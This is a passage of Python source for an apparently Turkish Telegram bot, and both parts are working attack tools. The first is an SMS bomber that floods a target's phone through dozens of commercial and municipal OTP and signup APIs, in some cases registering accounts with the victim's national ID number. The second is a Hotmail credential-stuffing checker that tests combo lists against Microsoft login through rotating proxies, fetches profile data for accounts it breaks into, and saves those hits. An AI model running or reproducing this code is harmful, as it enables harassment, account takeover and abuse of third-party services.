
    def Englishhome(self):
        try:
            url = "https://www.englishhome.com:443/api/member/sendOtp"
            headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0"}
            r = requests.post(url, json={"Phone": self.phone, "XID": ""}, headers=headers, timeout=6)
            if r.json().get("isError") == False:
                self.adet += 1
        except:
            pass

    def Suiste(self):
        try:
            url = "https://suiste.com:443/api/auth/code"
            headers = {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "User-Agent": "suiste/1.7.11 (com.mobillium.suiste; build:1469; iOS 15.8.3) Alamofire/5.9.1"}
            data = {"action": "register", "device_id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "full_name": "Memati Bas", "gsm": self.phone, "is_advertisement": "1", "is_contract": "1", "password": "31MeMaTi31"}
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.json().get("code") == "common.success":
                self.adet += 1
        except:
            pass

    def KimGb(self):
        try:
            url = "https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp"
            r = requests.post(url, json={"msisdn": "90" + self.phone}, timeout=6)
            if r.status_code == 200:
                self.adet += 1
        except:
            pass

    def Evidea(self):
        try:
            url = "https://www.evidea.com:443/users/register/"
            data = {"first_name": "Memati", "last_name": "Bas", "email": self.mail, "email_allowed": "false", "sms_allowed": "true", "password": "31ABC..abc31", "phone": "0" + self.phone, "confirm": "true"}
            r = requests.post(url, data=data, timeout=6)
            if r.status_code == 202:
                self.adet += 1
        except:
            pass

    def Ucdortbes(self):
        try:
            url = "https://api.345dijital.com:443/api/users/register"
            r = requests.post(url, json={"email": "", "name": "Memati", "phoneNumber": "+90" + self.phone, "surname": "Bas"}, timeout=6)
            if r.json().get("error") != "E-Posta veya telefon zaten kayıtlı!":
                self.adet += 1
        except:
            pass

    def TiklaGelsin(self):
        try:
            url = "https://svc.apps.tiklagelsin.com:443/user/graphql"
            query = {"operationName": "GENERATE_OTP", "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", "variables": {"challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68", "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB", "phone": "+90" + self.phone}}
            r = requests.post(url, json=query, timeout=6)
            if r.json().get("data", {}).get("generateOtp") == True:
                self.adet += 1
        except:
            pass

    def Naosstars(self):
        try:
            url = "https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350"
            r = requests.post(url, json={"telephone": "+90" + self.phone, "type": "register"}, timeout=6)
            if r.status_code == 200:
                self.adet += 1
        except:
            pass

    def Koton(self):
        try:
            url = "https://www.koton.com:443/users/register/"
            data = {"first_name": "Memati", "last_name": "Bas", "email": self.mail, "password": "31ABC..abc31", "phone": "0" + self.phone, "confirm": "true", "sms_allowed": "true", "email_allowed": "true", "date_of_birth": "1993-07-02", "call_allowed": "true"}
            r = requests.post(url, data=data, timeout=6)
            if r.status_code == 202:
                self.adet += 1
        except:
            pass

    def Hayatsu(self):
        try:
            url = "https://api.hayatsu.com.tr:443/api/SignUp/SendOtp"
            r = requests.post(url, data={"mobilePhoneNumber": self.phone, "actionType": "register"}, timeout=6)
            if r.json().get("is_success") == True:
                self.adet += 1
        except:
            pass

    def Hizliecza(self):
        try:
            url = "https://prod.hizliecza.net:443/mobil/account/sendOTP"
            r = requests.post(url, json={"otpOperationType": 1, "phoneNumber": "+90" + self.phone}, timeout=6)
            if r.status_code == 200:
                self.adet += 1
        except:
            pass

    def Metro(self):
        try:
            url = "https://mobile.metro-tr.com:443/api/mobileAuth/validateSmsSend"
            r = requests.post(url, json={"methodType": "2", "mobilePhoneNumber": self.phone}, timeout=6)
            if r.json().get("status") == "success":
                self.adet += 1
        except:
            pass

    def File(self):
        try:
            url = "https://api.filemarket.com.tr:443/v1/otp/send"
            r = requests.post(url, json={"mobilePhoneNumber": "90" + self.phone}, timeout=6)
            if r.json().get("responseType") == "SUCCESS":
                self.adet += 1
        except:
            pass

    def Akasya(self):
        try:
            url = "https://akasyaapi.poilabs.com:443/v1/en/sms"
            r = requests.post(url, json={"phone": self.phone}, timeout=6)
            if r.json().get("result") == "SMS sended succesfully!":
                self.adet += 1
        except:
            pass

    def Akbati(self):
        try:
            url = "https://akbatiapi.poilabs.com:443/v1/en/sms"
            r = requests.post(url, json={"phone": self.phone}, timeout=6)
            if r.json().get("result") == "SMS sended succesfully!":
                self.adet += 1
        except:
            pass

    def Komagene(self):
        try:
            url = "https://gateway.komagene.com.tr:443/auth/auth/smskodugonder"
            r = requests.post(url, json={"FirmaId": 32, "Telefon": self.phone}, timeout=6)
            if r.json().get("Success") == True:
                self.adet += 1
        except:
            pass

    def Porty(self):
        try:
            url = "https://panel.porty.tech:443/api.php?"
            headers = {"Token": "q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ", "Content-Type": "application/json; charset=UTF-8"}
            r = requests.post(url, json={"job": "start_login", "phone": self.phone}, headers=headers, timeout=6)
            if r.json().get("status") == "success":
                self.adet += 1
        except:
            pass

    def Tasdelen(self):
        try:
            url = "https://tasdelen.sufirmam.com:3300/mobile/send-otp"
            r = requests.post(url, json={"phone": self.phone}, timeout=6)
            if r.json().get("result") == True:
                self.adet += 1
        except:
            pass

    def Uysal(self):
        try:
            url = "https://api.uysalmarket.com.tr:443/api/mobile-users/send-register-sms"
            r = requests.post(url, json={"phone_number": self.phone}, timeout=6)
            if r.status_code == 200:
                self.adet += 1
        except:
            pass

    def Yapp(self):
        try:
            url = "https://yapp.com.tr:443/api/mobile/v1/register"
            data = {"app_version": "1.1.5", "code": "tr", "device_model": "iPhone8,5", "device_name": "Memati", "device_type": "I", "device_version": "15.8.3", "email": self.mail, "firstname": "Memati", "is_allow_to_communication": "1", "language_id": "2", "lastname": "Bas", "phone_number": self.phone, "sms_code": ""}
            r = requests.post(url, json=data, timeout=6)
            if r.status_code == 200:
                self.adet += 1
        except:
            pass

    def YilmazTicaret(self):
        try:
            url = "https://app.buyursungelsin.com:443/api/customer/form/checkx"
            formatted = f"0 ({self.phone[:3]}) {self.phone[3:6]} {self.phone[6:8]} {self.phone[8:]}"
            data = {"fonksiyon": "customer/form/checkx", "method": "POST", "telephone": formatted, "token": "d7841d399a16d0060d3b8a76bf70542e"}
            r = requests.post(url, data=data, timeout=6)
            if r.status_code == 200:
                self.adet += 1
        except:
            pass

    def Beefull(self):
        try:
            url1 = "https://app.beefull.io:443/api/inavitas-access-management/signup"
            data1 = {"email": self.mail, "firstName": "Memati", "language": "tr", "lastName": "Bas", "password": "123456", "phoneCode": "90", "phoneNumber": self.phone, "tenant": "beefull", "username": self.mail}
            requests.post(url1, json=data1, timeout=4)
            url2 = "https://app.beefull.io:443/api/inavitas-access-management/sms-login"
            r = requests.post(url2, json={"phoneCode": "90", "phoneNumber": self.phone, "tenant": "beefull"}, timeout=4)
            if r.status_code == 200:
                self.adet += 1
        except:
            pass

    def Dominos(self):
        try:
            url = "https://frontend.dominos.com.tr:443/api/customer/sendOtpCode"
            r = requests.post(url, json={"email": self.mail, "isSure": False, "mobilePhone": self.phone}, timeout=6)
            if r.json().get("isSuccess") == True:
                self.adet += 1
        except:
            pass

    def Baydoner(self):
        try:
            url = "https://crmmobil.baydoner.com:7004/Api/Customers/AddCustomerTemp"
            data = {"AppVersion": "1.6.0", "AreaCode": 90, "City": "ADANA", "CityId": 1, "Email": self.mail, "Name": "Memati", "PhoneNumber": self.phone, "Surname": "Bas", "Password": "31ABC..abc31"}
            r = requests.post(url, json=data, timeout=6)
            if r.json().get("Control") == 1:
                self.adet += 1
        except:
            pass

    def Pidem(self):
        try:
            url = "https://restashop.azurewebsites.net:443/graphql/"
            query = {"query": "\n  mutation ($phone: String) {\n    sendOtpSms(phone: $phone) {\n      resultStatus\n      message\n    }\n  }\n", "variables": {"phone": self.phone}}
            r = requests.post(url, json=query, timeout=6)
            if r.json().get("data", {}).get("sendOtpSms", {}).get("resultStatus") == "SUCCESS":
                self.adet += 1
        except:
            pass

    def Frink(self):
        try:
            url = "https://api.frink.com.tr:443/api/auth/postSendOTP"
            r = requests.post(url, json={"areaCode": "90", "etkContract": True, "language": "TR", "phoneNumber": "90" + self.phone}, timeout=6)
            if r.json().get("processStatus") == "SUCCESS":
                self.adet += 1
        except:
            pass

    def Bodrum(self):
        try:
            url = "https://gandalf.orwi.app:443/api/user/requestOtp"
            headers = {"Apikey": "Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE", "Content-Type": "application/json"}
            r = requests.post(url, json={"gsm": "+90" + self.phone, "source": "orwi"}, headers=headers, timeout=6)
            if r.status_code == 200:
                self.adet += 1
        except:
            pass

    def KofteciYusuf(self):
        try:
            url = "https://gateway.poskofteciyusuf.com:1283/auth/auth/smskodugonder"
            r = requests.post(url, json={"FirmaId": 82, "Telefon": self.phone}, timeout=6)
            if r.json().get("Success") == True:
                self.adet += 1
        except:
            pass

    def Little(self):
        try:
            url = "https://api.littlecaesars.com.tr:443/api/web/Member/Register"
            data = {"CampaignInform": True, "Email": self.mail, "InfoRegister": True, "IsLoyaltyApproved": True, "NameSurname": "Memati Bas", "Password": "31ABC..abc31", "Phone": self.phone, "SmsInform": True}
            r = requests.post(url, json=data, timeout=6)
            if r.status_code == 200 and r.json().get("status") == True:
                self.adet += 1
        except:
            pass

    def Orwi(self):
        try:
            url = "https://gandalf.orwi.app:443/api/user/requestOtp"
            headers = {"Apikey": "YWxpLTEyMzQ1MTEyNDU2NTQzMg", "Content-Type": "application/json"}
            r = requests.post(url, json={"gsm": "+90" + self.phone, "source": "orwi"}, headers=headers, timeout=6)
            if r.status_code == 200:
                self.adet += 1
        except:
            pass

    def Coffy(self):
        try:
            url = "https://user-api-gw.coffy.com.tr:443/user/signup"
            r = requests.post(url, json={"countryCode": "90", "gsm": self.phone, "isKVKKAgreementApproved": True, "isUserAgreementApproved": True, "name": "Memati Bas"}, timeout=6)
            if r.status_code == 200:
                self.adet += 1
        except:
            pass

    def Hamidiye(self):
        try:
            url = "https://bayi.hamidiye.istanbul:3400/hamidiyeMobile/send-otp"
            r = requests.post(url, json={"isGuest": False, "phone": self.phone}, timeout=6)
            if r.json().get("result") == True:
                self.adet += 1
        except:
            pass

    def Money(self):
        try:
            url = "https://www.money.com.tr:443/Account/ValidateAndSendOTP"
            formatted = f"{self.phone[:3]} {self.phone[3:10]}"
            r = requests.post(url, data={"phone": formatted, "GRecaptchaResponse": ""}, timeout=6)
            if r.json().get("resultType") == 0:
                self.adet += 1
        except:
            pass

    def Alixavien(self):
        try:
            url = "https://www.alixavien.com.tr:443/api/member/sendOtp"
            r = requests.post(url, json={"Phone": self.phone, "XID": ""}, timeout=6)
            if r.json().get("isError") == False:
                self.adet += 1
        except:
            pass

    def Jimmykey(self):
        try:
            url = f"https://www.jimmykey.com:443/tr/p/User/SendConfirmationSms?gsm={self.phone}&gRecaptchaResponse=undefined"
            r = requests.post(url, timeout=6)
            if r.json().get("Sonuc") == True:
                self.adet += 1
        except:
            pass

    def Ido(self):
        try:
            url = "https://api.ido.com.tr:443/idows/v2/register"
            data = {"birthDate": True, "captcha": "", "checkPwd": "313131", "code": "", "day": 24, "email": self.mail, "emailNewsletter": False, "firstName": "MEMATI", "gender": "MALE", "lastName": "BAS", "mobileNumber": "0" + self.phone, "month": 9, "pwd": "313131", "smsNewsletter": True, "tckn": self.tc, "termsOfUse": True, "year": 1977}
            r = requests.post(url, json=data, timeout=6)
            if r.status_code == 200:
                self.adet += 1
        except:
            pass

    def Fatih(self):
        try:
            url = "https://ebelediye.fatih.bel.tr:443/Sicil/KisiUyelikKaydet"
            data = {"SahisUyelik.TCKimlikNo": self.tc, "SahisUyelik.DogumTarihi": "28.12.1999", "SahisUyelik.Ad": "Memati", "SahisUyelik.Soyad": "Bas", "SahisUyelik.CepTelefonu": self.phone, "SahisUyelik.EPosta": self.mail, "SahisUyelik.Sifre": "Memati31", "SahisUyelik.SifreyiDogrula": "Memati31", "recaptchaValid": "true"}
            r = requests.post(url, data=data, verify=False, timeout=6)
            if r.status_code == 200:
                self.adet += 1
        except:
            pass

    def Sancaktepe(self):
        try:
            url = "https://e-belediye.sancaktepe.bel.tr:443/Sicil/KisiUyelikKaydet"
            data = {"SahisUyelik.TCKimlikNo": self.tc, "SahisUyelik.DogumTarihi": "13.01.2000", "SahisUyelik.Ad": "MEMATİ", "SahisUyelik.Soyad": "BAS", "SahisUyelik.CepTelefonu": self.phone, "SahisUyelik.EPosta": self.mail, "SahisUyelik.Sifre": "Memati31", "SahisUyelik.SifreyiDogrula": "Memati31", "recaptchaValid": "true"}
            r = requests.post(url, data=data, verify=False, timeout=6)
            if r.status_code == 200:
                self.adet += 1
        except:
            pass

    def Bayrampasa(self):
        try:
            url = "https://ebelediye.bayrampasa.bel.tr:443/Sicil/KisiUyelikKaydet"
            data = {"SahisUyelik.TCKimlikNo": self.tc, "SahisUyelik.DogumTarihi": "07.06.2000", "SahisUyelik.Ad": "MEMATİ", "SahisUyelik.Soyad": "BAS", "SahisUyelik.CepTelefonu": self.phone, "SahisUyelik.EPosta": self.mail, "SahisUyelik.Sifre": "Memati31", "SahisUyelik.SifreyiDogrula": "Memati31", "recaptchaValid": "true"}
            r = requests.post(url, data=data, verify=False, timeout=6)
            if r.status_code == 200:
                self.adet += 1
        except:
            pass


def _get_sms_services():
    return [attr for attr in dir(SendSms) if callable(getattr(SendSms, attr)) and not attr.startswith('__') and attr != 'adet']


def _sms_worker(phone: str, mail: str, mode: str, limit, interval: float,
                stop_event: threading.Event, uid: int, bot_instance):
    sms = SendSms(phone, mail)
    services = _get_sms_services()
    count = 0

    try:
        if mode == "turbo":
            while not stop_event.is_set():
                threads = []
                for fn_name in services:
                    if stop_event.is_set():
                        break
                    try:
                        t = threading.Thread(target=getattr(sms, fn_name), daemon=True)
                        threads.append(t)
                        t.start()
                    except:
                        pass

                for t in threads:
                    try:
                        t.join(timeout=5)
                    except:
                        pass

                count += len(services)
                with _SMS_LOCK:
                    if uid in _SMS_SESSIONS:
                        _SMS_SESSIONS[uid]["count"] = count

        else:
            while not stop_event.is_set():
                for fn_name in services:
                    if stop_event.is_set():
                        break
                    if limit and count >= limit:
                        stop_event.set()
                        break
                    try:
                        getattr(sms, fn_name)()
                        count += 1
                        with _SMS_LOCK:
                            if uid in _SMS_SESSIONS:
                                _SMS_SESSIONS[uid]["count"] = count
                    except:
                        pass

                    if interval > 0:
                        stop_event.wait(interval)

    except Exception as e:
        print(f"[SMS WORKER] Error: {e}")
    finally:
        with _SMS_LOCK:
            if uid in _SMS_SESSIONS:
                _SMS_SESSIONS[uid]["running"] = False
                _SMS_SESSIONS[uid]["count"] = count


def _launch_sms_bomb(uid, phone, mail, mode, limit, interval, bot_instance):
    with _SMS_LOCK:
        if uid in _SMS_SESSIONS and _SMS_SESSIONS[uid].get("running"):
            bot_instance.send_message(uid, "⚠️ Zaten aktif bir SMS bombardımanı var!\n/smsstop ile durdurun.")
            return

    stop_event = threading.Event()
    services = _get_sms_services()
    mode_txt = "🚀 Turbo" if mode == "turbo" else "⚡ Normal"
    limit_txt = str(limit) if limit else "Sonsuz ♾️"
    interval_txt = f"{interval}s" if mode == "normal" else "Maksimum Hız"

    bot_instance.send_message(
        uid,
        f"💣 <b>SMS Bomber Başladı!</b>\n\n"
        f"📱 Hedef: <code>{phone}</code>\n"
        f"📊 Servis: <b>{len(services)}</b> API\n"
        f"⚙️ Mod: <b>{mode_txt}</b>\n"
        f"🔢 Limit: <b>{limit_txt}</b>\n"
        f"⏱ Aralık: <b>{interval_txt}</b>\n\n"
        f"🛑 Durdurmak için: /smsstop\n"
        f"📊 Durum için: /smsstatus"
    )

    t = threading.Thread(
        target=_sms_worker,
        args=(phone, mail, mode, limit, interval, stop_event, uid, bot_instance),
        daemon=True
    )

    with _SMS_LOCK:
        _SMS_SESSIONS[uid] = {
            "running": True,
            "thread": t,
            "event": stop_event,
            "count": 0,
            "target": phone,
            "mode": mode,
            "start_time": datetime.now().strftime("%H:%M:%S"),
            "services": len(services)
        }
    t.start()


def _sms_step1_number(msg, bot_instance):
    uid = msg.from_user.id
    phone = msg.text.strip()
    if not (phone.isdigit() and len(phone) == 10):
        bot_instance.reply_to(msg, "❌ Geçersiz numara! 10 haneli olmalı (başında 0 olmadan).\nÖrnek: 5306524123")
        return
    m = bot_instance.reply_to(msg, f"📱 Hedef: <code>{phone}</code>\n\n📧 Mail adresi girin (bilmiyorsanız - gönderin):")
    bot_instance.register_next_step_handler(m, lambda m: _sms_step2_mail(m, phone, bot_instance))


def _sms_step2_mail(msg, phone, bot_instance):
    uid = msg.from_user.id
    mail = msg.text.strip()
    if mail == "-":
        mail = ""
    if mail and ("@" not in mail or "." not in mail):
        mail = ""
    mk = InlineKeyboardMarkup(row_width=2)
    mk.add(InlineKeyboardButton("⚡ Normal Mod", callback_data=f"sms_normal_{phone}_{mail}"),
           InlineKeyboardButton("🚀 Turbo Mod", callback_data=f"sms_turbo_{phone}_{mail}"))
    bot_instance.reply_to(msg, f"📱 Hedef: <code>{phone}</code>\n📧 Mail: <code>{mail or 'Rastgele'}</code>\n\n⚙️ <b>Mod seçin:</b>",
                          reply_markup=mk)


def _sms_normal_settings(msg, phone, mail, bot_instance):
    uid = msg.from_user.id
    try:
        parts = msg.text.strip().split()
        limit = int(parts[0]) if parts else 0
        interval = float(parts[1]) if len(parts) > 1 else 0
    except:
        limit = 0
        interval = 0

    if limit < 0:
        limit = 0
    if interval < 0:
        interval = 0

    _launch_sms_bomb(uid, phone, mail, "normal", limit, interval, bot_instance)


# ══════════════════════════════════════════════════════════════
#  HOTMAIL CHECKER v4.0
# ══════════════════════════════════════════════════════════════

HOTMAIL_QUEUE = queue.Queue()
HOTMAIL_CURRENT_TASK: Optional[dict] = None
HOTMAIL_QUEUE_LOCK = threading.Lock()
HOTMAIL_QUEUE_RUNNING = False
HOTMAIL_QUEUE_THREAD = None
HOTMAIL_THREADS = 10
HOTMAIL_HIT = 0
HOTMAIL_BAD = 0
HOTMAIL_ERROR = 0
HOTMAIL_2FA = 0
HOTMAIL_REWARDS = 0
HOTMAIL_PROCESSED = 0
HOTMAIL_LOCK = threading.Lock()
HOTMAIL_KEYWORD_HITS = {}
HOTMAIL_COUNTRY_HITS = {}
HOTMAIL_START_TIME = None

PROXY_LIST = []
PROXY_INDEX = 0
PROXY_LOCK = threading.Lock()

COUNTRY_CODES = {
    "TR": "🇹🇷", "US": "🇺🇸", "GB": "🇬🇧", "DE": "🇩🇪", "FR": "🇫🇷",
    "BR": "🇧🇷", "AR": "🇦🇷", "MX": "🇲🇽", "TH": "🇹🇭", "ES": "🇪🇸",
    "IT": "🇮🇹", "NL": "🇳🇱", "RU": "🇷🇺", "CN": "🇨🇳", "JP": "🇯🇵",
    "KR": "🇰🇷", "IN": "🇮🇳", "AU": "🇦🇺", "CA": "🇨🇦", "ZA": "🇿🇦",
}


def get_country_flag(country_code):
    return COUNTRY_CODES.get(country_code.upper(), f"🌍 {country_code.upper()}")


def get_next_proxy():
    global PROXY_INDEX
    with PROXY_LOCK:
        if not PROXY_LIST:
            return None
        proxy = PROXY_LIST[PROXY_INDEX % len(PROXY_LIST)]
        PROXY_INDEX += 1
        return proxy


def _get_login_session(proxy=None):
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "DNT": "1",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Cache-Control": "max-age=0",
    })
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}
    return session


def _extract_login_params(session, email):
    try:
        url = "https://login.live.com/oauth20_authorize.srf"
        params = {
            "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
            "redirect_uri": "https://login.live.com/oauth20_desktop.srf",
            "response_type": "code",
            "scope": "openid profile email",
            "login_hint": email,
            "mkt": "en-US",
        }
        resp = session.get(url, params=params, timeout=15, allow_redirects=True)
        text = resp.text

        ppft_match = re.search(r'name="PPFT"[^>]*value="([^"]+)"', text)
        ppft = ppft_match.group(1) if ppft_match else None

        url_post_match = re.search(r'urlPost:[\'"]?([^\'",}]+)', text)
        url_post = url_post_match.group(1) if url_post_match else "https://login.live.com/ppsecure/post.srf"

        flow_token_match = re.search(r'"sFT":"([^"]+)"', text)
        flow_token = flow_token_match.group(1) if flow_token_match else ppft

        sctx_match = re.search(r'"sCtx":"([^"]+)"', text)
        sctx = sctx_match.group(1) if sctx_match else ""

        cookies = session.cookies.get_dict()

        return {
            "success": True,
            "ppft": flow_token or ppft,
            "url_post": url_post,
            "sctx": sctx,
            "cookies": cookies,
            "text_sample": text[:500]
        }
    except Exception as e:
        return {"success": False, "error": str(e)}


def _check_hotmail_oauth(email, password, proxy=None, max_retries=3):
    for attempt in range(max_retries):
        session = _get_login_session(proxy)
        try:
            params = _extract_login_params(session, email)
            if not params["success"]:
                if attempt < max_retries - 1:
                    time.sleep(1)
                    continue
                return {"status": "error", "detail": params.get("error", "Param extraction failed")}

            ppft = params["ppft"]
            url_post = params["url_post"]
            cookies = params["cookies"]

            login_data = {
                "login": email,
                "loginfmt": email,
                "type": "11",
                "LoginOptions": "3",
                "passwd": password,
                "KMSI": "1",
                "NewUser": "1",
                "PPFT": ppft,
                "PPSX": "Pa",
                "i13": "0",
                "ps": "2",
                "fspost": "0",
                "CookieDisclosure": "0",
                "IsFidoSupported": "1",
                "isSignupPost": "0",
                "isRecoveryAttemptPost": "0",
                "i19": "0",
            }

            cookie_str = "; ".join([f"{k}={v}" for k, v in cookies.items()])

            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://login.live.com",
                "Referer": "https://login.live.com/",
                "Cookie": cookie_str,
            }

            resp = session.post(url_post, data=login_data, headers=headers,
                                timeout=20, allow_redirects=False)

            text = resp.text
            headers_resp = resp.headers
            status_code = resp.status_code

            location = headers_resp.get('Location', '')

            if 'code=' in location or 'access_token' in location:
                token_info = _get_access_token_from_redirect(session, location)
                account_info = _get_account_info(token_info.get("token")) if token_info.get("token") else {}
                return {
                    "status": "hit",
                    "email": email,
                    "password": password,
                    "name": account_info.get("name", "Bilinmiyor"),
                    "country": account_info.get("country", "Bilinmiyor"),
                    "detail": "Login successful"
                }

            if any(x in text.lower() for x in [
                "two-step", "2fa", "authenticator", "security code",
                "verify your identity", "additional security", "microsoft authenticator",
                "enter code", "send code", "proofup", "mfa", "two factor"
            ]) or "proofup" in location.lower():
                return {
                    "status": "2fa",
                    "email": email,
                    "password": password,
                    "detail": "2FA enabled"
                }

            if any(x in text.lower() for x in [
                "incorrect password", "wrong password", "doesn't exist",
                "account doesn't exist", "invalid password", "sign in error",
                "that password is incorrect", "we couldn't find", "account not found",
                "doesn't look right", "password is incorrect", "login failed"
            ]) or status_code == 200 and "sSigninName" not in text:
                return {
                    "status": "bad",
                    "email": email,
                    "password": password,
                    "detail": "Invalid credentials"
                }

            if any(x in text.lower() for x in [
                "captcha", "recaptcha", "challenge", "verify you're human",
                "i'm not a robot", "g-recaptcha"
            ]):
                return {
                    "status": "captcha",
                    "email": email,
                    "password": password,
                    "detail": "Captcha required"
                }

            if any(x in text.lower() for x in [
                "locked", "suspended", "blocked", "temporarily locked",
                "unusual activity", "security alert", "account restricted"
            ]):
                return {
                    "status": "locked",
                    "email": email,
                    "password": password,
                    "detail": "Account locked/suspended"
                }

            return {
                "status": "error",
                "email": email,
                "password": password,
                "detail": f"Unknown response (status={status_code})",
                "sample": text[:200]
            }

        except requests.exceptions.ProxyError as e:
            if attempt < max_retries - 1:
                time.sleep(1)
                continue
            return {"status": "error", "detail": f"Proxy error: {str(e)}"}
        except requests.exceptions.Timeout:
            if attempt < max_retries - 1:
                time.sleep(2)
                continue
            return {"status": "error", "detail": "Timeout"}
        except Exception as e:
            if attempt < max_retries - 1:
                time.sleep(1)
                continue
            return {"status": "error", "detail": str(e)}
        finally:
            session.close()


def _get_access_token_from_redirect(session, location):
    try:
        if 'code=' in location:
            code = location.split('code=')[1].split('&')[0]
            token_url = "https://login.live.com/oauth20_token.srf"
            data = {
                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "code": code,
                "redirect_uri": "https://login.live.com/oauth20_desktop.srf",
                "grant_type": "authorization_code",
            }
            resp = session.post(token_url, data=data, timeout=15)
            if resp.status_code == 200:
                json_data = resp.json()
                return {
                    "token": json_data.get("access_token"),
                    "refresh_token": json_data.get("refresh_token"),
                    "success": True
                }
        return {"success": False}
    except:
        return {"success": False}


def _get_account_info(access_token):
    if not access_token:
        return {}
    try:
        headers = {"Authorization": f"Bearer {access_token}"}
        resp = requests.get("https://graph.microsoft.com/v1.0/me", headers=headers, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            return {
                "name": data.get("displayName", "Bilinmiyor"),
                "email": data.get("mail") or data.get("userPrincipalName", ""),
                "country": data.get("country", "Bilinmiyor"),
                "job": data.get("jobTitle", ""),
                "phone": data.get("mobilePhone", ""),
            }
        return {}
    except:
        return {}


@dataclass
class HotmailTask:
    user_id: int
    user_name: str
    combo_list: list
    thread_count: int
    status_msg_id: int
    chat_id: int
    is_premium: bool = False
    task_id: str = None
    queue_position: int = 0
    keywords: list = None

    def __post_init__(self):
        if not self.task_id:
            self.task_id = f"{self.user_id}_{datetime.now().strftime('%Y%m%d%H%M%S')}"
        if not self.keywords:
            self.keywords = get_user_keywords(self.user_id)


def hotmail_worker(combo_line, user_id, user_name, is_premium, keywords):
    global HOTMAIL_HIT, HOTMAIL_BAD, HOTMAIL_ERROR, HOTMAIL_2FA, HOTMAIL_REWARDS, HOTMAIL_PROCESSED
    global HOTMAIL_KEYWORD_HITS, HOTMAIL_COUNTRY_HITS

    try:
        if ":" not in combo_line:
            with HOTMAIL_LOCK:
                HOTMAIL_BAD += 1
                HOTMAIL_PROCESSED += 1
            return

        email, password = combo_line.split(":", 1)
        email = email.strip()
        password = password.strip()

        if not email or not password:
            with HOTMAIL_LOCK:
                HOTMAIL_BAD += 1
                HOTMAIL_PROCESSED += 1
            return

        time.sleep(0.1)

        proxy = get_next_proxy()
        result = _check_hotmail_oauth(email, password, proxy=proxy, max_retries=3)
        status = result["status"]

        with HOTMAIL_LOCK:
            HOTMAIL_PROCESSED += 1

            if status == "hit":
                HOTMAIL_HIT += 1
                save_hotmail_log(user_id, user_name, email, password, "HIT", result.get("detail", ""))

                name = result.get("name", "Bilinmiyor")
                country = result.get("country", "Bilinmiyor")

                email_lower = email.lower()
                for kw in keywords:
                    if kw.lower() in email_lower:
                        HOTMAIL_KEYWORD_HITS[kw] = HOTMAIL_KEYWORD_HITS.get(kw, 0) + 1
                        break

                if '.' in email:
                    domain = email.split('.')[-1].upper()
                    if len(domain) == 2:
                        HOTMAIL_COUNTRY_HITS[domain] = HOTMAIL_COUNTRY_HITS.get(domain, 0) + 1

                if "rewards" in email_lower or "microsoft" in email_lower:
                    HOTMAIL_REWARDS += 1

                hit_line = f"{email}:{password}"
                if name != "Bilinmiyor":
                    hit_line += f" | Name: {name}"
                if country != "Bilinmiyor":
                    hit_line += f" | Country: {country}"

                with open(f"hits_{user_id}.txt", "a", encoding="utf-8") as f:
                    f.write(hit_line + "\n")

                print(f"✅ HIT | {user_name} | {email}:{password} | {name} | {country}")

            elif status == "2fa":
                HOTMAIL_2FA += 1
                save_hotmail_log(user_id, user_name, email, password, "2FA", result.get("detail", ""))
                print(f"🔐 2FA | {user_name} | {email}")

            elif status == "captcha":
                HOTMAIL_ERROR += 1
                save_hotmail_log(user_id, user_name, email, password, "CAPTCHA", result.get("detail", ""))
                print(f"🤖 CAPTCHA | {user_name} | {email}")

            elif status == "locked":
                HOTMAIL_ERROR += 1
                save_hotmail_log(user_id, user_name, email, password, "LOCKED", result.get("detail", ""))
                print(f"🔒 LOCKED | {user_name} | {email}")

            elif status == "bad":
                HOTMAIL_BAD += 1
                save_hotmail_log(user_id, user_name, email, password, "BAD", result.get("detail", ""))
                print(f"❌ BAD | {user_name} | {email}")

            else:
                HOTMAIL_ERROR += 1
                save_hotmail_log(user_id, user_name, email, password, "ERROR", result.get("detail", "Unknown"))
                print(f"⚠️ ERROR | {user_name} | {email} | {result.get('detail', 'Unknown')}")

    except Exception as e:
        with HOTMAIL_LOCK:
            HOTMAIL_ERROR += 1
            HOTMAIL_PROCESSED += 1
        print(f"⚠️ WORKER ERROR | {user_name} | {e}")


def hotmail_check(username, password):
    proxy = get_next_proxy()
    result = _check_hotmail_oauth(username, password, proxy=proxy, max_retries=3)
    return result["status"]


def process_hotmail_queue():
    global HOTMAIL_CURRENT_TASK, HOTMAIL_QUEUE_RUNNING, main_bot
    global HOTMAIL_HIT, HOTMAIL_BAD, HOTMAIL_ERROR, HOTMAIL_2FA, HOTMAIL_REWARDS
    global HOTMAIL_KEYWORD_HITS, HOTMAIL_COUNTRY_HITS, HOTMAIL_START_TIME

    while HOTMAIL_QUEUE_RUNNING:
        try:
            try:
                task = HOTMAIL_QUEUE.get(timeout=5)
            except queue.Empty:
